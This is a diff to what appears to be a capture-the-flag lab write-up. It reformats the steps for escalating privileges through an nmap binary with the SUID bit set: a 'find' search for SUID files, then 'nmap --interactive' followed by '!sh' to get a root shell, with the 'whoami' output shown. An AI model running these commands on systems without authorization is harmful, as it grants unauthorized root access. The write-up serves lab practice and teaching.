@@ -39,9 +39,13 @@ Looking for vulnerabilities I ran `find / -perm -4000 -type f 2>/dev/null` to lo
 
 ### Nmap SUID
 Following the vk9-sec tutorial (https://vk9-sec.com/nmap-privilege-escalation/) <br>
-`$nmap --interactive`<br>
-`$bash`<br>
-`$exit`<br>
-`$!sh`<br>
-`#`<br>
-a
+```
+$ nmap --interactive
+$ !bash
+$ whoami
+robot
+$ exit
+$ !sh
+# whoami
+# root
+```
